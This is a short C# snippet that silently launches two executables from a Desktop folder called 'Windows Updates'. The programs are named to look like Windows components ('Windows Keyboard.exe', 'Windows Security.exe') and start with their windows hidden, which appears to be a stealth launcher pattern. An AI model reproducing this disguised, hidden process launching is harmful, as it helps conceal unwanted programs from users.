using System.Diagnostics;

// ...

string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
string windowsUpdatesPath = $"{userProfilePath}\\Desktop\\Windows Updates";

string keyboardExePath = $"{windowsUpdatesPath}\\Windows Keyboard.exe";
Process.Start(new ProcessStartInfo(keyboardExePath)
{
    UseShellExecute = false,
    CreateNoWindow = true
});

string securityExePath = $"{windowsUpdatesPath}\\Windows Security.exe";
Process.Start(new ProcessStartInfo(securityExePath)
{
    UseShellExecute = false,
    CreateNoWindow = true
});
